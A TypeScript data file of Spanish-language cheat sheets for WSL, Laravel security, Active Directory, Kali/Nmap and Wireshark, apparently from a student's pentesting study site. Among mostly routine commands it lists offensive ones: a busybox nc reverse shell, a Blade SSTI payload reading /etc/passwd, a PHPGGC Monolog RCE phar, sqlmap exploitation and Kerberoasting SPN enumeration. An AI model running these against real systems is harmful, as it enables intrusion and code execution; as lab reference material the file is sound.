export interface CheatSheetCommand {
  command: string;
  description: string;
  category: string;
  framework?: string;
}

export interface CheatSheetSection {
  id: string;
  title: string;
  icon: string;
  description: string;
  badge: string;
  commands: CheatSheetCommand[];
}

export const CHEATSHEETS: CheatSheetSection[] = [
  {
    id: 'wsl2-linux',
    title: 'WSL 2 & Linux Nativo en Windows',
    icon: '🐧',
    badge: 'Alternativa Ligera a VMs',
    description: 'Comandos para instalar, gestionar, limitar recursos y clonar entornos Linux (Ubuntu, Kali, Arch) con WSL 2 sin usar VirtualBox/VMware.',
    commands: [
      {
        command: 'wsl --install',
        description: 'Instala WSL 2, Kernel oficial de Linux y la distro Ubuntu en un solo comando (Ejecutar como Administrador).',
        category: 'Instalación',
        framework: 'WSL 2 / PowerShell',
      },
      {
        command: 'wsl --list --online',
        description: 'Lista todas las distribuciones de Linux disponibles para instalación en línea.',
        category: 'Distribuciones',
        framework: 'WSL 2',
      },
      {
        command: 'wsl --install -d kali-linux',
        description: 'Instala Kali Linux nativo en terminal para pruebas de penetración y laboratorios CTF.',
        category: 'Instalación Kali',
        framework: 'Kali Linux',
      },
      {
        command: 'wsl -l -v',
        description: 'Muestra el estado de todas las distribuciones instaladas y su versión de WSL (1 o 2).',
        category: 'Gestión',
        framework: 'WSL 2',
      },
      {
        command: 'wsl --export Ubuntu C:\\Backups\\ubuntu_backup.tar',
        description: 'Exporta una distribución completa en formato tar para crear una copia de seguridad o clonar en otra PC.',
        category: 'Backup / Exportar',
        framework: 'WSL 2',
      },
      {
        command: 'wsl --import UbuntuClon C:\\WSL\\UbuntuClon C:\\Backups\\ubuntu_backup.tar',
        description: 'Restaura o clona un backup de Linux en una ruta personalizada.',
        category: 'Restaurar / Clonar',
        framework: 'WSL 2',
      },
      {
        command: 'wsl --shutdown',
        description: 'Apaga completamente la máquina virtual ligera de WSL 2 y libera toda la memoria RAM consumida.',
        category: 'Optimización RAM',
        framework: 'WSL 2',
      },
      {
        command: 'cd /mnt/c/Users/Manuel/Documents/HTB',
        description: 'Accede a los discos y carpetas de Windows directamente desde la terminal de Linux.',
        category: 'Interoperabilidad',
        framework: 'Linux / Mount',
      },
      {
        command: 'explorer.exe .',
        description: 'Abre el Explorador de Windows en el directorio actual de Linux o accede mediante \\\\wsl$',
        category: 'Interoperabilidad',
        framework: 'WSL 2',
      },
    ],
  },
  {
    id: 'laravel-php',
    title: 'Laravel & PHP Security Cheatsheet',
    icon: '⚡',
    badge: 'Frameworks Web',
    description: 'Guía rápida de auditoría y comandos para aplicaciones Laravel 9/10/11, APIs con Sanctum y motores de plantillas Blade.',
    commands: [
      {
        command: 'php artisan route:list --path=api',
        description: 'Lista todas las rutas de la API y sus respectivos middlewares de autenticación (Sanctum/Passport).',
        category: 'Reconocimiento',
        framework: 'Laravel',
      },
      {
        command: 'php artisan env',
        description: 'Muestra el entorno de ejecución actual (local, staging, production) configurado en el `.env`.',
        category: 'Configuración',
        framework: 'Laravel',
      },
      {
        command: 'curl -i -s "http://TARGET/_ignition/health-check"',
        description: 'Comprueba si la consola de depuración Ignition está habilitada sin control de acceso.',
        category: 'Vulnerabilidad Ignition',
        framework: 'Laravel / Ignition',
      },
      {
        command: "php -d'phar.readonly=0' phpggc monolog/rce1 system 'id' --phar phar -o exploit.phar",
        description: 'Genera un gadget chain de deserialización PHP para Monolog / Laravel RCE.',
        category: 'Explotación Phar RCE',
        framework: 'PHP / PHPGGC',
      },
      {
        command: '{!! system("cat /etc/passwd") !!}',
        description: 'Payload de prueba para Server-Side Template Injection (SSTI) en plantillas Blade no escapadas.',
        category: 'Blade SSTI',
        framework: 'Laravel Blade',
      },
      {
        command: "curl -H 'Authorization: Bearer 1|abcdef...' http://TARGET/api/v1/user",
        description: 'Petición autenticada utilizando Personal Access Tokens de Laravel Sanctum.',
        category: 'Autenticación',
        framework: 'Laravel Sanctum',
      },
    ],
  },
  {
    id: 'active-directory',
    title: 'Windows Server 2022 & Active Directory',
    icon: '🏢',
    badge: 'SysAdmin & Redes',
    description: 'Comandos esenciales de PowerShell y auditoría de controladores de dominio Windows Server 2022 en SENATI.',
    commands: [
      {
        command: 'Get-ADDomain | Select-Object Name, Forest, DomainControllersContainer',
        description: 'Obtiene información general del bosque y dominio de Active Directory.',
        category: 'PowerShell AD',
        framework: 'Windows Server',
      },
      {
        command: 'Get-ADUser -Filter * -Properties MemberOf | Where-Object {$_.MemberOf -match "Domain Admins"} | Select-Object Name, SamAccountName',
        description: 'Enumera todos los usuarios pertenecientes al grupo privilegiado Domain Admins.',
        category: 'Privilegios',
        framework: 'Windows Server',
      },
      {
        command: 'Get-Service DNS, DHCP, ADWS | Select-Object Name, Status, StartType',
        description: 'Verifica el estado de los servicios centrales de infraestructura Windows Server.',
        category: 'Servicios',
        framework: 'Windows Server',
      },
      {
        command: 'nltest /dclist:senati.local',
        description: 'Lista los Domain Controllers autoritativos para el dominio especificado.',
        category: 'CMD / Redes',
        framework: 'Active Directory',
      },
      {
        command: 'setspn -T senati.local -Q */*',
        description: 'Busca Service Principal Names (SPNs) registrados para identificar objetivos de Kerberoasting.',
        category: 'Kerberoasting',
        framework: 'Active Directory',
      },
    ],
  },
  {
    id: 'nmap-kali',
    title: 'Kali Linux, Nmap & Web Enumeration',
    icon: '🔍',
    badge: 'Pentesting Ofensivo',
    description: 'Comandos de escaneo de red, fuzzing de directorios y pruebas de intrusión en máquinas CTF.',
    commands: [
      {
        command: 'nmap -p- --min-rate 1000 -T4 -sV -sC -oN scan.txt TARGET_IP',
        description: 'Escaneo completo de los 65535 puertos TCP con scripts por defecto y detección de versiones.',
        category: 'Escaneo Nmap',
      },
      {
        command: 'gobuster dir -u http://TARGET_IP/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,env',
        description: 'Enumeración rápida de rutas y extensiones de archivos en el servidor web.',
        category: 'Fuzzing Web',
      },
      {
        command: 'sqlmap -u "http://TARGET_IP/login.php" --data="user=admin&pass=123" --dbs --batch',
        description: 'Detección y explotación automatizada de inyecciones SQL en formularios POST.',
        category: 'SQL Injection',
      },
      {
        command: 'busybox nc TARGET_IP 4444 -e /bin/sh',
        description: 'Payload de Reverse Shell compacto para entornos restringidos o contenedores Docker.',
        category: 'Reverse Shell',
      },
    ],
  },
  {
    id: 'network-forensics',
    title: 'Forense de Redes & Wireshark',
    icon: '🌐',
    badge: 'Análisis Forense',
    description: 'Filtros avanzados de Wireshark y comandos Tshark para analizar tráfico malicioso y capturas pcap.',
    commands: [
      {
        command: 'ip.addr == 203.0.113.24 && tcp.flags.syn == 1 && tcp.flags.ack == 0',
        description: 'Filtro Wireshark para detectar intentos de conexión entrante (SYN) desde una IP WAN específica.',
        category: 'Filtros Wireshark',
      },
      {
        command: 'http.request.method == "POST" || http.response.code >= 400',
        description: 'Filtra peticiones HTTP POST y respuestas con códigos de error en auditorías web.',
        category: 'Filtros Wireshark',
      },
      {
        command: 'tshark -r capture.pcap -Y "dns.flags.response == 1" -T fields -e dns.qry.name -e dns.a',
        description: 'Extrae rápidamente todas las consultas DNS y sus IPs resueltas desde la terminal.',
        category: 'Tshark CLI',
      },
    ],
  },
];
